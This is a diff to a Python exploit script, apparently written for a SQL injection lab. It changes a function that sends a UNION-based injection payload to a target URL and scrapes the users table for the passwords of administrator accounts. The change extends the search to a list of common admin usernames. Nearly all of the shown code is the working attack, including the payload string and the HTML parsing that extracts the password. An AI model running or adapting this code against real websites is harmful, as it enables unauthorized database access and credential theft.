@@ -68,20 +68,21 @@ def find_urls_to_test(url, base_url):
 
 # perform SQL injection to find the administrator's password
 def exploit_sqli_users_table(url):
-    # print("[+] Starting SQL Injection on users table.")
-    username = 'administrator'
+    common_usernames = ['administrator', 'admin', 'root', 'superuser', 'sysadmin']
     sql_payload = "' UNION select username, password from users--"
     r = requests.get(url + sql_payload, verify=False, proxies=proxies)
     res = r.text
-
-    if username in res:
-        # print("[+] Found the administrator password.")
-        soup = BeautifulSoup(r.text, 'html.parser')
-        admin_password = soup.body.find(string="administrator").parent.findNext('td').contents[0]
-        print("[+] Encontramos la contasena del usuario administrador '%s'" % admin_password)
-        return True
+    
+    for username in common_usernames:
+        if username in res:
+            # print(f"[+] Found the password for user '{username}'.")
+            soup = BeautifulSoup(r.text, 'html.parser')
+            admin_password = soup.body.find(string=username).parent.findNext('td').contents[0]
+            print(f"[+] Encontramos la contraseña del usuario '{username}': '{admin_password}'")
+            return True
     
     return False
+
 
 # perform the SQL injection
 def exploit_sqli(url):
